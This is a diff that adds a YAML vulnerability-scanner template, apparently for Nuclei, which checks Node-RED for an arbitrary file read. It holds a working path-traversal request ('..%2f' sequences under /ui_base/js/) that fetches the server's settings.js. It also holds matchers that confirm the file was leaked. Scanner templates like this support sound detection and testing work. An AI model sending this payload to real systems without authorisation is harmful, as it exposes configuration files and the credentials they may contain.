@@ -1,0 +1,19 @@
+id: node-red-arbitrary-file-read
+info:
+  name: "Node-RED 任意文件读取漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: node-red
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/ui_base/js/..%2f..%2f..%2f..%2fsettings.js"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "To password protect the Node-RED editor and admin API, the following"
